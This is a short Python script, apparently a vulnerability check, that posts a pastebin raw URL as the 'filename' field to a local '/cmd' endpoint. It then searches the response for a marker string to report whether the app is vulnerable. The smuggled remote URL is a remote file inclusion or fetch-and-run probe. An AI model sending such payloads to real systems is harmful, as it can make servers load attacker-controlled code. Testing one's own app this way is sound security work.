import requests


def main(url):
    req = requests.post(url, data={'filename' : "https://pastebin.com/raw/c5jWFxap"})
    result = bool(req.text.find("6459") > 0)
    if result :
        msg = "The app is vulnerable"
    else :
        msg = "You are in good hands"
    return (result, msg)

if __name__ == '__main__':
	url = "http://localhost:5000/cmd"
	res = main(url)
	print(res)